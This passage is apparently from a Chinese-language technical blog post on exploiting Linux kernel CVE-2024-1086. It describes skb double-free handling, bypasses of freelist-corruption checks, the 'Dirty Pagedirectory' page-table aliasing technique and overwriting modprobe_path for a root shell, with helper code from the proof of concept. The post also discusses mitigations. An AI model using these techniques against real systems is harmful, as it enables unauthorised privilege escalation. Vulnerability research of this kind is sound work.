<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">rmqueue_bulk</span><span class="params">(<span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> count, <span class="keyword">struct</span> list_head *<span class="built_in">list</span>,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> migratetype, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> __rmqueue(zone, order, migratetype, alloc_flags);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(page == <span class="literal">NULL</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        list_add_tail(&amp;page-&gt;pcp_list, <span class="built_in">list</span>);</span><br><span class="line">        <span class="comment">// [snip] 设置统计信息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [snip] 设置统计信息</span></span><br><span class="line">    spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="4-2-2-竞态条件（已过时）"><a href="#4-2-2-竞态条件（已过时）" class="headerlink" title="4.2.2 竞态条件（已过时）"></a>4.2.2 竞态条件（已过时）</h5><blockquote>
<p>此技术已过时，但曾用于 <code>kernelctf</code> 漏洞利用。</p>
</blockquote>
<p>第一次 <code>free()</code> 操作将页面附加到正确的空闲列表，并将页面的 <code>order</code> 设置为 0。然而，当执行双重释放（第二次 <code>free</code>）时，页面将被添加到 <code>order 0</code> 的空闲列表中，因为这是该页面的 <code>order</code>。通过这种方式，我们可以将 <code>order == 4</code> 的页面添加到 <code>order == 0</code> 的空闲列表中，使用双重释放原语。</p>
<p><strong>插图 4.2.2.1</strong>：将页面 <code>order</code> 设置为 0 的内存操作时间线。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/converting_page_order-1.svg"
                     
                ><br>不幸的是，此技术存在竞态条件。当在没有拦截分配的情况下第二次释放页面时（<code>free; free; alloc; alloc</code>），页面的引用计数会下降到 0 以下，并且不会允许双重释放，因此我们需要进行页面引用计数操控（<code>free; alloc; free; alloc</code>）。然而，第二次释放时的 <code>order</code> 将不会为 0，因为 <code>alloc</code> 会将 <code>order</code> 设置为原来的数量（即 <code>order 4</code>）。现在，似乎不可能将页面转换为 <code>order 0</code>，因为这将导致引用计数为 -1，或者页面保持原始顺序（正常情形）。于是我们引入了竞态条件。</p>
<p>当页面被释放时，其 <code>order</code> 是通过值传递的。这意味着如果在第二次释放期间双重释放的页面被分配，它将被分配到 <code>order 0</code> 的空闲列表中，并且引用计数将递增，因此不会变为 -1，而是保持为 0。如你所想，竞态窗口非常小，因为它只包含一些函数调用。然而，如果 <code>order</code> 为 0，<code>free_large_kmalloc()</code> 函数会向 <code>dmesg</code> 打印一个内核警告（<code>WARN()</code>）。通常情况下，这个窗口只有 1ms，但对于像 QEMU 虚拟机（具有串行终端）这样的虚拟化系统，窗口时间为 50ms-300ms，这足够多次命中。</p>
<p>现在我们已成功将页面附加到 <code>order 0</code> 的空闲列表，这意味着我们现在可以使用任何 <code>order 0</code> 页面的分配来覆盖该页面。我们还可以通过释放该对象并将其重新分配为新对象来转换第一个页面引用（通过第一次释放获得的引用），因为页面的 <code>order</code> 将会保持不变。如果我们正在使用页面引用计数操控，我们希望释放占据第一个引用的对象并重新分配它。</p>
<h2 id="4-3-直接释放-skb-而不使用-UDP-TCP-堆栈"><a href="#4-3-直接释放-skb-而不使用-UDP-TCP-堆栈" class="headerlink" title="4.3 直接释放 skb 而不使用 UDP&#x2F;TCP 堆栈"></a>4.3 直接释放 skb 而不使用 UDP&#x2F;TCP 堆栈</h2><p>当我们避免空闲列表的损坏检查时，可能希望在任意时间直接释放某个 <code>skb</code>，以使我们的漏洞利用以非常快速、同步的方式运行，从而减少损坏的可能性。</p>
<blockquote>
<p>注意，这种行为通常针对本地 UDP 数据包进行，但在双重释放中的第一次释放后，<code>skb</code> 会损坏，这意味着我不能使用 TCP 或 UDP 堆栈来实现此目的，因为它们利用了损坏的字段。</p>
<p><strong>已过时（KERNELCTF 漏洞利用）</strong>：或者，我们可能希望在特定的 CPU 上释放某个 <code>skb</code> 以绕过双重释放检测，因为 <code>sk_buff</code> 的空闲列表是每个 CPU 独立的。这意味着如果我们在 2 个 CPU 上连续释放同一个对象，双重释放将不会被检测到。我们无法“将上一个 <code>skb</code> 发送到月球”（即分配一个永不过期的 <code>skb</code>）来防止双重释放检测，因为这会通过更改指针或从空闲列表中分配相同的指针来改变 <code>skb</code> 头页，从而无论如何都无法防止双重释放。</p>
</blockquote>
<p>幸运的是，IP 数据包分片及其分片队列的存在解决了这个问题。当一个 IP 数据包正在等待其所有分片被接收时，这些分片被放入 IP 分片队列（红黑树）中。当接收到的分片具有完整 IP 数据包的预期长度时，数据包会在最后一个分片来自的 CPU 上重新组装。请注意，该 IP 分片队列有一个超时时间为 <code>ipfrag_time</code> 秒，该超时时间将释放所有 <code>skb</code>。如何更改该超时时间将在后续子章节中提到。</p>
<p>如果我们希望将 <code>skb</code> 空闲列表中的条目 <code>skb1</code> 从 CPU 0 切换到 CPU 1，可以将其分配为一个 IP 分片加入到 CPU 0 上的新 IP 分片队列中。然后，我们在 CPU 1 上发送 <code>skb2</code> ——该队列的最后一个 IP 分片。这样就会使 <code>skb1</code> 在 CPU 1 上被释放。</p>
<p>这种相同的行为可以用于随意释放 <code>skb</code>，而无需使用 UDP&#x2F;TCP 代码。这对于漏洞利用非常有利，因为双重释放的包在第一次释放时就会被损坏。如果使用 UDP 代码，内核会因为各种恶劣的行为而崩溃。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/switching_skb_cpu-1.svg"
                      alt="插图 4.3.1：切换 `skb` 的每 CPU 空闲列表的活动时间线"
                ></p>
<p>不幸的是，IP 分片队列的最终大小由 <code>skb-&gt;len</code> 决定，而在释放后由于与 slab 缓存的 <code>s-&gt;random</code> 重叠而完全随机化。有关详细信息，请查看下一节。这意味着实际上很难完成 IP 分片队列，因为它会使用随机的预期长度。</p>
<p>因此，我提出了一种不同的策略：不完成 IP 分片队列，而是通过无效输入使其抛出错误。这会导致 IP 分片队列中的所有 <code>skb</code> 在产生错误的 <code>skb</code> 所在的 CPU 上立即被释放，而不考虑 <code>skb-&gt;len</code>。</p>
<p>当你自己实现这种技术时，注意如果不在释放 <code>skb1</code> 和分配 <code>skb2</code> 之间追加“无辜”的 <code>skb</code> 对象，则会触发双重释放检测（<code>CONFIG_FREELIST_HARDENED</code>）。出于演示目的，这些内容被省略在图表中，但已包含在 PoC 部分。</p>
<h3 id="4-3-1-修改-skb-的最大存活时间"><a href="#4-3-1-修改-skb-的最大存活时间" class="headerlink" title="4.3.1 修改 skb 的最大存活时间"></a>4.3.1 修改 skb 的最大存活时间</h3><p>根据不同的使用场景，我们可能希望 <code>skb</code> 存活的时间更长或更短。幸运的是，内核提供了一个用户态接口，可以通过 <code>/proc/sys/net/ipv4/ipfrag_time</code> 配置 IP 分片队列的超时时间。这是针对每个网络命名空间的，因此可以由无特权用户在其自己的网络命名空间中设置。</p>
<p>当我们使用 IP 分片重新组装一个分割的 IP 数据包时，内核将在 <code>ipfrag_time</code> 秒后发出超时。如果我们将 <code>ipfrag_time</code> 设置为 999999 秒，内核将让该分片 <code>skb</code> 存活 999999 秒。相反，如果我们希望快速分配和释放一个随机 CPU 上的 <code>skb</code>，我们可以将其设置为 1 秒。</p>
<p>代码块 4.3.1.1：用于设置 <code>ipfrag_time</code> 变量的用户态 C 代码。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_ipfrag_time</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seconds)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/sys/net/ipv4/ipfrag_time&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open$ipfrag_time&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dprintf(fd, <span class="string">&quot;%u\n&quot;</span>, seconds);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<h2 id="4-4-绕过-KernelCTF-skb-损坏检查"><a href="#4-4-绕过-KernelCTF-skb-损坏检查" class="headerlink" title="4.4 绕过 KernelCTF skb 损坏检查"></a>4.4 绕过 KernelCTF skb 损坏检查</h2><p>在 KernelCTF 的缓解实例中，我唯一需要主动绕过的缓解措施是空闲列表损坏检查，特别是检查正在分配的对象中空闲列表的下一个指针是否损坏。</p>
<p>不幸的是，空闲列表的下一个指针与 <code>skb-&gt;len</code> 重叠，因为 <code>skbuff_head_cache-&gt;offset == 0x70</code>。这意味着空闲列表的下一个&#x2F;上一个条目的指针存储在 <code>sk_buff+0x70</code>，这恰好与 <code>skb-&gt;len</code> 重叠。在线资料表明，内核开发人员通常将 <code>s-&gt;offset</code> 设置为 slab 大小的一半，以避免越界写入能够覆盖空闲列表指针，这在过去曾导致通过越界漏洞轻松提权。</p>
<p>在第一次释放 <code>skb</code> 后，<code>skb-&gt;len</code> 字段会被部分覆盖为下一个指针的值。在 <code>skb</code> 第二次释放之前的代码中，<code>skb-&gt;len</code> 字段会因数据包解析而被修改。因此，在第二次释放 <code>skb</code> 之前，空闲列表的下一个指针就已经被损坏。</p>
<p>当我们尝试使用 <code>slab_alloc_node()</code> 分配第一次释放的 <code>skb</code> 的空闲列表条目（在发生上述损坏之后）时，释放的对象中的空闲列表的下一个指针会在 <code>freelist_ptr_decode()</code> 调用中被标记为损坏：</p>
<p>代码块 4.4.1：内核函数 <code>freelist_pointer_corrupted()</code> 的 C 代码（KernelCTF 缓解实例），包含原始注释。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">freelist_pointer_corrupted</span><span class="params">(<span class="keyword">struct</span> slab *slab, <span class="type">freeptr_t</span> ptr,</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *decoded)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_VIRTUAL</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果 freepointer 解码为 0，则使用 0 作为 slab_base，以便</span></span><br><span class="line"><span class="comment">     * 下面的检查始终通过 (0 &amp; slab-&gt;align_mask == 0)。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> slab_base = decoded ? (<span class="type">unsigned</span> <span class="type">long</span>)slab_to_virt(slab) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 这验证了 SLUB freepointer 是否指向 slab 之外。既然此时我们</span></span><br><span class="line"><span class="comment">     * 基本上可以免费完成这项操作，它还会检查指针对齐看起来是否大致合理。</span></span><br><span class="line"><span class="comment">     * 然而，我们可能不希望在此处承担适当的除法成本，</span></span><br><span class="line"><span class="comment">     * 因此我们只是进行一个简单的检查，检查在大小中清除的底部位是否也在指针中清除。</span></span><br><span class="line"><span class="comment">     * 因此，对于 kmalloc-32，它执行完美的对齐检查，但对于 kmalloc-192，它仅检查指针是否是 32 的倍数。</span></span><br><span class="line"><span class="comment">     * 这可能需要重新考虑——这是一种很好的权衡，还是应去掉这一部分，或者我们想要一个准确的对齐检查</span></span><br><span class="line"><span class="comment">     * （并且我们能否使其在相对于安全性改进的可接受性能成本下工作——可能不行）？</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> CHECK_DATA_CORRUPTION(</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>)decoded &amp; slab-&gt;align_mask) != slab_base,</span><br><span class="line">        <span class="string">&quot;bad freeptr (encoded %lx, ptr %p, base %lx, mask %lx&quot;</span>,</span><br><span class="line">        ptr.v, decoded, slab_base, slab-&gt;align_mask);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<p>经过一些研究，我发现这个检查不会被回溯执行：当我们在具有损坏空闲列表条目的对象之上释放另一个对象时，缓解措施不会检查前一个对象是否具有损坏的下一个指针。这意味着我们可以通过在损坏的对象之后释放另一个 <code>skb</code> 来屏蔽无效的下一个指针，然后再使用旧 <code>skb</code> 的数据分配该 <code>skb</code>。这基本上掩盖了原始损坏的 <code>skb</code>，同时仍然可以重复分配 <code>skb</code> 数据。</p>
<p>下图试图通过对一个 <code>skb</code> 对象执行双重释放来解释这种现象，就像这篇博文中的漏洞利用一样。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/bypass_freelist_corruption-2.svg"
                     
                ></p>
<p>KernelCTF 的开发者可以通过在释放时检查空闲列表头的下一个指针是否损坏（而不仅仅是在分配时检查）来缓解这一问题。</p>
<h2 id="4-5-脏页目录（Dirty-Pagedirectory）"><a href="#4-5-脏页目录（Dirty-Pagedirectory）" class="headerlink" title="4.5. 脏页目录（Dirty Pagedirectory）"></a>4.5. 脏页目录（Dirty Pagedirectory）</h2><h3 id="4-5-1-思路"><a href="#4-5-1-思路" class="headerlink" title="4.5.1. 思路"></a>4.5.1. 思路</h3><p>脏页表（Dirty Pagetable）是我迄今为止遇到的最有趣的技术之一。当我在研究现成的双重释放漏洞利用技术时，脏页表浮现出来，它似乎是完美的技术。</p>
<p>但是，我意识到在我的双重释放漏洞上下文中，对 PTE 页面进行持续写操作会是一个不太理想的体验。我无法找到任何允许被完全覆盖用户数据的页面大小对象，同时它们还必须在与 PTE 页面相同的页面空闲列表中。由于稳定性和兼容性相关的原因，我不想使用跨缓存攻击，因为这会给漏洞利用增加更多复杂性。</p>
<p>接下来我花了一整晚头脑风暴，得到了以下想法：考虑到我在与 PTE 相同的空闲列表中有一个双重释放的页面——如果能够跨进程进行 PTE 双重分配，比如 <code>sudo</code> 和漏洞利用进程会怎样？这将实质上在两个完全不相关的进程之间实现内存共享（将漏洞利用的虚拟地址指向 <code>sudo</code> 的物理地址）。因此，理论上可以操纵以 root 权限运行的进程中的应用数据，从而利用它获得 root shell。考虑到进程启动时会发生其他分配，这种方法有些不切实际，因此在空闲列表上需要非常好的位置管理。</p>
<p>这给了我下一个想法：如果能够双重分配一个漏洞利用的 PTE 页面和一个漏洞利用的 PMD 页面，这将意味着 PMD 将反向引用 PTE 的页面（作为 PTE 值），并因此将 PTE 的用户页面解析为 PTE。</p>
<p>幸运的是，这种 PMD+PTE 方法是可行的。其他方法如 PUD+PMD 也被确认可行，甚至 PGD+PUD 可能也可以用。唯一的区别在于同时镜像的页数量：PTE+PMD 可以镜像 1GiB 页，PUD+PMD 可以镜像 512GiB 页，PGD+PUD 则可能是 256TiB 页（如果这可能实现）。请注意，这对内存使用有影响，镜像过多的内存可能会导致系统出现内存不足（OOM）。</p>
<p>此外，在选择 PMD+PTE 和 PUD+PMD 之间时，还需要考虑如何将脏页目录集成到漏洞利用中。我在 PTE 喷射部分中对此进行了解释，但通常来说，PMD+PTE 应该是最佳选择。</p>
<h3 id="4-5-2-技术细节"><a href="#4-5-2-技术细节" class="headerlink" title="4.5.2. 技术细节"></a>4.5.2. 技术细节</h3><p>脏页目录技术允许根据物理地址对任何内存页面进行无限制、稳定的读&#x2F;写操作。它可以通过设置自己的权限标志来绕过权限检查。这允许我们的漏洞利用对只读页面进行写操作，比如那些包含 <code>modprobe_path</code> 的页面。</p>
<blockquote>
<p>在本节中，我解释了 PUD+PMD 的实现，但它与 PoC 漏洞利用中的 PMD+PTE 策略大致相同。</p>
</blockquote>
<p>该技术本质上非常简单：使用双重释放之类的漏洞，分配一个页面上层目录（PUD）和一个页面中间目录（PMD）到相同的内核地址。虚拟内存区域（VMA）应是分开的，以避免冲突（即不要在 PUD 的区域内分配 PMD）。然后，在 PMD 范围内的页面中写入一个地址，并在 PUD 范围对应页面中读取该地址。下图尝试解释这一现象（与下面的示例互为补充）。</p>
<p><strong>插图 4.5.2.1</strong>：脏页目录技术的层次结构概述，包括所需的内存操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/dirtypagedirectory.svg"
                     
                ></p>
<p>为了更实际地理解这一点，让我们想象以下场景：臭名昭著的 <code>modprobe_path</code> 变量存储在物理帧号（PFN）&#x2F;物理地址 <code>0xCAFE1460</code> 处。我们应用脏页目录：通过 <code>mmap</code> 对用户态 VMA 范围 <code>0x8000000000 - 0x10000000000</code>（<code>mm-&gt;pgd[1]</code>）和 <code>0x40000000 - 0x80000000</code>（<code>mm-&gt;pgd[0][1]</code>）分别进行 PUD 和 PMD 页的双重分配。</p>
<p>这意味着 <code>mm-&gt;pgd[1][x][y]</code> 始终等于 <code>mm-&gt;pgd[0][1][x][y]</code>，因为 <code>mm-&gt;pgd[1]</code> 和 <code>mm-&gt;pgd[0][1]</code> 都引用同一个地址&#x2F;对象，因为我们对它们进行了双重分配。可以观察到 <code>mm-&gt;pgd[0][1][x][y]</code> 是用户态页面，而 <code>mm-&gt;pgd[1][x][y]</code> 是 PTE。这意味着专用的 PUD 区域会将 PMD 区域的用户态页面解释为 PTE。</p>
<p>现在，为了读取物理页面地址 <code>0xCAFE1460</code>，我们将 PUD 区域 PTE 的第一个条目设置为 <code>0x80000000CAFE1867</code>（附加了 PTE 标志），通过将该值写入 <code>0x40000000</code>（即页面 <code>mm-&gt;pgd[0][1][0][0]+0x0</code> 的用户态地址）。根据上述关联规则，这意味着我们将该值写入页面 <code>mm-&gt;pgd[1][0][0]+0x0</code> 的 PTE 地址，因为 <code>mm-&gt;pgd[1][0][0] == mm-&gt;pgd[0][1][0][0]</code>。现在，我们可以通过读取页面 <code>mm-&gt;pgd[1][0][0][0]</code> 来反引用这个恶意 PTE 值（最后的索引为 0，因为我们将其写入了 PTE 的前 8 个字节：注意上面的 <code>0x0</code>）。这等同于用户态页面 <code>0x8000000000</code>。</p>
<p>由于 PTE 现在从用户态发生了变化，我们需要刷新 TLB，因为 TLB 中包含了过时的记录。一旦完成，<code>printf(&#39;%s&#39;, 0x8000000460);</code> 应该打印 <code>/sbin/modprobe</code> 或者 <code>modprobe_path</code> 的值。当然，我们现在可以通过执行 <code>strcpy((char*)0x8000000460, &quot;/tmp/privesc.sh&quot;);</code> 来覆盖 <code>modprobe_path</code>（有 <code>KMOD_PATH_LEN</code> 字节的填充空间），并获得一个 root shell。不需要刷新 TLB，因为在写入地址时，PTE 本身并没有发生变化。</p>
<blockquote>
<p>注意我们在 PTE 值 <code>0x80000000CAFE1867</code> 中设置了读&#x2F;写标志。请注意，虚拟地址 <code>0x8000000460</code> 和 PTE 值 <code>0x80000000CAFE1867</code> 中的 <code>0x8</code> 彼此没有关系：在 PTE 值中它是一个被激活的标志，而虚拟地址恰好以 <code>0x8</code> 开头。</p>
</blockquote>
<p>总结来说：将 PTE 值写入 VMA 范围 <code>0x40000000 - 0x80000000</code> 中的用户态页面，并通过读取和写入 <code>0x8000000000 - 0x10000000000</code> 范围内的对应用户态页面进行解引用。</p>
<h3 id="4-5-3-缓解措施"><a href="#4-5-3-缓解措施" class="headerlink" title="4.5.3. 缓解措施"></a>4.5.3. 缓解措施</h3><p>我使用了这种技术绕过了当前内核中的许多缓解措施（包括虚拟 KASLR、KPTI、SMAP、SMEP 和 <code>CONFIG_STATIC_USERMODEHELPER</code>），尽管其他缓解措施在 PoC 漏洞利用中通过一些简陋的工程方法被绕过。</p>
<p>当此技术被同行审查时，我被问及它是如何绕过 SMAP 的。答案很简单：SMAP 仅适用于虚拟地址，而不适用于物理内存地址。PTE 在 PMD 中是通过其物理地址引用的。这意味着当 PMD 中的 PTE 条目是用户态页面时，SMAP 不会检测到它，因为它不是虚拟地址。因此，PUD 区域可以自由地将用户态页面用作 PTE，而不会受到 SMAP 的干扰。</p>
<p>可以通过在表条目中设置一个类型来检测 PMD 是否分配在 PUD 的位置上，从而缓解这种技术的影响，因为我们无法伪造 PMD 和 PUD 自身的条目。例如，可以为 PTE 设置类型 0，PMD 设置类型 1，PUD 设置类型 2，P4D 设置类型 3，PGD 设置类型 4，等等。然而，这需要在每个表条目中设置 <code>2log(levels)</code> 个比特位（启用了 P4D 时为 3 个比特位，因为 <code>levels=5</code>），这将牺牲未来可能用于功能扩展的空间，并且运行时的检查可能会引入大量的开销，因为每次内存访问都必须检查每个级别。此外，这种缓解措施仍然允许强制内存共享（即将漏洞利用的 PTE 页面与以 root 运行的 <code>sudo</code> 的 PTE 页面重叠）。</p>
<h2 id="4-6-为脏页目录喷射页表"><a href="#4-6-为脏页目录喷射页表" class="headerlink" title="4.6. 为脏页目录喷射页表"></a>4.6. 为脏页目录喷射页表</h2><p>您可能注意到上面的脏页目录部分提到了 PUD+PMD，而 PoC 使用的是 PMD+PTE。这与漏洞利用排干 PCP 列表以便在双重释放的地址中分配 PTE 相关。</p>
<p>首先，页表是由内核按需分配的，因此如果我们对虚拟内存区域进行了 <code>mmap</code>，则不会进行分配。只有当我们实际读取&#x2F;写入该 VMA 时，才会为被访问的页面分配所需的页表。例如，当分配 PUD 时，PMD、PTE 和用户态页面也会被分配；而当分配 PTE 时，目标用户态页面也会被分配。</p>
<p>原始的脏页表论文提到——非常优雅地——您可以通过先分配父级（例如 PMD）来喷射特定的页表级别，因为一个父级（如 PMD）包含 512 个子级（PTE）。因此，如果我们想要喷射 4096 个 PTE，我们需要预先分配 8 个（<code>4096/512 = 8</code>）PMD，之后再分配 PTE。</p>
<p>如果我们喷射 PMD，PTE 也将被分配——它们来自同一个空闲列表。这意味着喷射内容中有 50% 是 PMD，50% 是 PTE。如果我们喷射 PUD，那么会是 33% PUD、33% PMD 和 33% PTE。因此，如果我们喷射 PTE，100% 都是 PTE，因为我们没有进行其他分配。基于这一点，我们在漏洞利用中使用 PMD+PTE 而不是 PUD+PMD，并且喷射 PMD 意味着稳定性降低 50%。</p>
<blockquote>
<p>请注意，用户态页面本身是从不同的空闲列表中分配的（迁移类型 <code>migratetype 0</code>，而非 <code>migratetype 1</code>）。</p>
</blockquote>
<h2 id="4-7-TLB-刷新"><a href="#4-7-TLB-刷新" class="headerlink" title="4.7. TLB 刷新"></a>4.7. TLB 刷新</h2><p>TLB 刷新是指移除或使转换后备缓冲（TLB）中的所有条目失效（虚拟地址到物理地址缓存）。为了使用脏页目录技术可靠地扫描地址，我们需要提出一种满足以下要求的 TLB 刷新技术：</p>
<ol>
<li><strong>不修改现有进程页表</strong></li>
<li><strong>必须 100% 有效</strong></li>
<li>必须快速</li>
<li>可以从用户态触发</li>
<li>必须在不考虑 PCID 的情况下工作</li>
</ol>
<p>基于这些要求，我提出了以下想法：在分配 PMD 和 PTE 内存区域时，应该将它们标记为共享，然后使用 <code>fork()</code> 创建一个子进程，让子进程执行 <code>munmap()</code> 来刷新 TLB，并让子进程进入睡眠状态（以避免如果底层漏洞利用不稳定导致崩溃）。最终得到如下函数：</p>
<p><strong>代码块 4.7.1</strong>：用户态函数的 C 代码，刷新某个虚拟内存范围的 TLB。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">flush_tlb</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">short</span> *status;</span><br><span class="line"></span><br><span class="line">    status = mmap(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(<span class="type">short</span>), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    *status = FLUSH_STAT_INPROGRESS;</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        munmap(addr, len);</span><br><span class="line">        *status = FLUSH_STAT_DONE;</span><br><span class="line">        PRINTF_VERBOSE(<span class="string">&quot;[*] flush tlb thread gonna sleep\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">9999</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SPINLOCK(*status == FLUSH_STAT_INPROGRESS);</span><br><span class="line"></span><br><span class="line">    munmap(status, <span class="keyword">sizeof</span>(<span class="type">short</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>锁定机制防止父进程在子进程刷新 TLB 之前继续执行。如果子进程执行退出而不是睡眠，则可以删除该锁定机制，因为父进程可以监视子进程的状态。</p>
<p>这种 TLB 刷新方法在刷新页表和页目录时始终有效。它已经在最近的 AMD CPU 和 QEMU 虚拟机中进行了测试。由于在这种使用情况下刷新必须从内核触发，因此它应该是与硬件无关的。</p>
<h2 id="4-8-处理物理-KASLR"><a href="#4-8-处理物理-KASLR" class="headerlink" title="4.8. 处理物理 KASLR"></a>4.8. 处理物理 KASLR</h2><p>物理内核地址空间布局随机化（Physical KASLR）是指对 Linux 内核的物理基址进行随机化。通常来说，这并不重要，因为几乎所有漏洞利用都使用虚拟内存（因此必须处理虚拟 KASLR）。</p>
<p>然而，由于我们漏洞利用的特性——它使用了脏页目录——我们需要获取目标内存的物理地址。</p>
<h3 id="4-8-1-获取物理内核基址"><a href="#4-8-1-获取物理内核基址" class="headerlink" title="4.8.1 获取物理内核基址"></a>4.8.1 获取物理内核基址</h3><p>通常来说，这意味着我们需要暴力搜索整个物理内存范围，以找到目标物理地址。</p>
<blockquote>
<p>物理内存指的是所有可用形式的物理内存地址：例如，在笔记本电脑上，16GiB 的内存条加上 1GiB 的内置 MMIO，总共有 17GiB 的物理内存。</p>
</blockquote>
<p>不过，Linux 内核的一个特点是，如果设置了 <code>CONFIG_RELOCATABLE=y</code>，则物理内核基址必须对齐到 <code>CONFIG_PHYSICAL_START</code>（即 <code>0x100&#39;0000</code>，即 16MiB）。如果 <code>CONFIG_RELOCATABLE=n</code>，则物理内核基址将恰好位于 <code>CONFIG_PHYSICAL_START</code>。在这种技术中，我们假设 <code>CONFIG_RELOCATABLE=y</code>，因为如果我们知道地址，就不需要暴力破解物理 KASLR。</p>
<blockquote>
